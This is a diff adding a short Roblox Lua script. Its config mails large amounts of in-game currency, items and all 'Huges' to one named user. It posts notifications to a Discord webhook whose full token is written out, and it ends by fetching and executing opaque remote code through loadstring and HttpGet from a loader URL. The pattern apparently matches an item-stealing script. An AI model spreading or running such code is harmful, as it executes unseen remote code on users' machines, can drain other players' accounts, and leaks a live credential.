@@ -1,0 +1,24 @@
+getgenv().Config = {
+    ["Mailing"] = {
+        ["Usernames"] = {"Kim_Huex"},
+        ["Items"] = {
+            ["Currency"] = {
+                ["Diamonds"] = 100000000,
+            },
+            ["Misc"] = {
+                ["Hellfire Core"] = 25,
+            },
+            ["Lootbox"] = {
+                ["Hellfire Gift"] = 25,
+            },
+        },
+        ["MailAllHuges"] = true
+    },
+    ["Notifications"] = {
+        ["UserID"] = "344054115539615745",
+        ["Webhook"] = "https://discord.com/api/webhooks/1336002888157106337/QT6lew-kyV_Vo_hRqGvDr2V1pMGGcV_xwAI0TKsC2bm3MagjE3StbuwHcw9cTW4o6Vra"
+    },
+    ["MaxRebirths"] = 5,
+    ["AutoUseCores"] = true
+}
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/3598f9e2d0ad9708cf974fac550d63f2.lua"))()
